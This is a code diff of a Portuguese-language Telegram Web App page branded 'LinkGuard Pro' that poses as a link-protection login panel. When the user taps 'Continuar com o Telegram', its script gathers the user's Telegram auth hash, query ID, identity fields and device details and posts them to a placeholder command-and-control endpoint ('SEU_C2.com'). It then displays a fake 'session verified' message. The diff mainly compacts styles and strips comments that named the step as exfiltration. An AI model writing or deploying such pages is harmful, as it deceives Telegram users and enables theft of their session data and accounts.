@@ -3,18 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LinkGuard - Acesso Restrito</title>
+    <title>LinkGuard Pro - Acesso Restrito</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --tg-theme-bg-color: #ffffff;
             --tg-theme-text-color: #000000;
             --tg-theme-hint-color: #707579;
-            --tg-theme-link-color: #2481cc;
             --tg-theme-button-color: #2481cc;
             --tg-theme-button-text-color: #ffffff;
             --tg-theme-secondary-bg-color: #f1f1f1;
-            --tg-theme-section-bg-color: #e0e0e0;
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -22,7 +20,6 @@
             color: var(--tg-theme-text-color);
             padding: 0;
             margin: 0;
-            -webkit-tap-highlight-color: transparent;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -48,16 +45,8 @@
             margin: 0 auto 16px;
             font-size: 32px;
         }
-        .title {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color);
-            margin-bottom: 24px;
-        }
+        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle { font-size: 14px; color: var(--tg-theme-hint-color); margin-bottom: 24px; }
         .tg-login-button {
             width: 100%;
             padding: 14px;
@@ -72,47 +61,18 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            transition: opacity 0.2s;
         }
-        .tg-login-button:active {
-            opacity: 0.8;
-        }
-        .tg-icon {
-            font-size: 20px;
-        }
-        .status-message {
-            margin-top: 16px;
-            font-size: 13px;
-            color: var(--tg-theme-hint-color);
-            min-height: 20px;
-        }
-        .error {
-            color: #d93025;
-        }
-        .success {
-            color: #188038;
-        }
-        .hidden {
-            display: none;
-        }
-        .content-area {
-            margin-top: 24px;
-            text-align: left;
-        }
+        .status-message { margin-top: 16px; font-size: 13px; color: var(--tg-theme-hint-color); min-height: 20px; }
+        .hidden { display: none; }
         .content-card {
             background-color: var(--tg-theme-bg-color);
             border-radius: 12px;
             padding: 16px;
             margin-bottom: 12px;
+            text-align: left;
         }
-        .content-title {
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        .content-text {
-            font-size: 14px;
-            color: var(--tg-theme-hint-color);
-        }
+        .content-title { font-weight: 600; margin-bottom: 8px; }
+        .content-text { font-size: 14px; color: var(--tg-theme-hint-color); }
     </style>
 </head>
 <body>
@@ -122,66 +82,40 @@
         <div class="subtitle">Acesse o painel de inteligência de links</div>
         
         <button class="tg-login-button" id="login-btn">
-            <span class="tg-icon">✈️</span>
-            Continuar com o Telegram
+            <span>✈️</span> Continuar com o Telegram
         </button>
-        
-        <div class="status-message" id="status-msg">
-            Autenticação necessária para prosseguir
-        </div>
+        <div class="status-message" id="status-msg">Autenticação necessária</div>
 
-        <div class="content-area hidden" id="content-area">
+        <div class="hidden" id="content-area" style="margin-top: 24px;">
             <div class="content-card">
                 <div class="content-title">✅ Sessão Verificada</div>
-                <div class="content-text">Bem-vindo, <span id="user-name">Usuário</span>! Sua sessão segura foi ativada.</div>
+                <div class="content-text">Bem-vindo, <span id="user-name">Usuário</span>!</div>
             </div>
             <div class="content-card">
                 <div class="content-title">🔒 Proteção Ativa</div>
-                <div class="content-text">Todos os links compartilhados serão analisados em tempo real.</div>
+                <div class="content-text">Links analisados em tempo real.</div>
             </div>
         </div>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        const C2_ENDPOINT = 'https://seu-c2.com/linkguard-auth';
-        let isAuthenticated = false;
+        const C2_ENDPOINT = 'https://SEU_C2.com/linkguard-auth';
 
-        // Validação do initData (Hash do Telegram)
-        function validateInitData(initData) {
-            // Em produção, você validaria o hash no servidor com o Bot Token
-            // Aqui, estamos apenas coletando os dados
-            return initData && initData.user && initData.hash;
-        }
-
-        // Coleta de Dados de Autenticação
         function collectAuthData() {
             const user = tg.initDataUnsafe.user;
             return {
                 event_type: 'linkguard_auth',
-                auth: {
-                    hash: tg.initDataUnsafe.hash,
-                    auth_date: tg.initDataUnsafe.auth_date,
-                    query_id: tg.initDataUnsafe.query_id
-                },
+                auth: { hash: tg.initDataUnsafe.hash, query_id: tg.initDataUnsafe.query_id },
                 user: {
-                    id: user.id,
-                    username: user.username,
-                    first_name: user.first_name,
-                    last_name: user.last_name,
-                    language_code: user.language_code,
-                    is_premium: user.is_premium
+                    id: user.id, username: user.username, first_name: user.first_name,
+                    last_name: user.last_name, language_code: user.language_code, is_premium: user.is_premium
                 },
-                device: {
-                    platform: tg.platform,
-                    version: tg.version,
-                    colorScheme: tg.colorScheme
-                },
+                device: { platform: tg.platform, version: tg.version, colorScheme: tg.colorScheme },
                 timestamp: new Date().toISOString()
             };
         }
 
-        // Exfiltração de Dados de Autenticação
         async function exfiltrateAuth(data) {
             try {
                 const response = await fetch(C2_ENDPOINT, {
@@ -196,50 +130,31 @@
             }
         }
 
-        // Lógica de Login
         async function handleLogin() {
             const statusMsg = document.getElementById('status-msg');
             const loginBtn = document.getElementById('login-btn');
-            
             loginBtn.disabled = true;
             statusMsg.textContent = 'Autenticando...';
-            statusMsg.className = 'status-message';
 
-            // Coleta os dados de autenticação
             const authData = collectAuthData();
-            
-            // Exfiltra os dados para o C2
             const success = await exfiltrateAuth(authData);
-            
+
             if (success) {
-                // Simula o delay de autenticação
                 setTimeout(() => {
-                    isAuthenticated = true;
                     document.getElementById('content-area').classList.remove('hidden');
                     document.getElementById('user-name').textContent = authData.user.first_name;
                     statusMsg.textContent = '✅ Acesso Liberado';
-                    statusMsg.className = 'status-message success';
                     tg.HapticFeedback.notificationOccurred('success');
                 }, 1000);
             } else {
-                statusMsg.textContent = '❌ Erro de Autenticação. Tente novamente.';
-                statusMsg.className = 'status-message error';
+                statusMsg.textContent = '❌ Erro de Autenticação';
                 loginBtn.disabled = false;
                 tg.HapticFeedback.notificationOccurred('error');
             }
         }
 
-        // Inicialização
         tg.ready();
         tg.expand();
-        
-        // Verifica se o usuário já está autenticado (ex: reabertura do app)
-        if (tg.initDataUnsafe.user) {
-            const user = tg.initDataUnsafe.user;
-            document.getElementById('user-name').textContent = user.first_name;
-        }
-
-        // Evento de Login
         document.getElementById('login-btn').addEventListener('click', handleLogin);
     </script>
 </body>
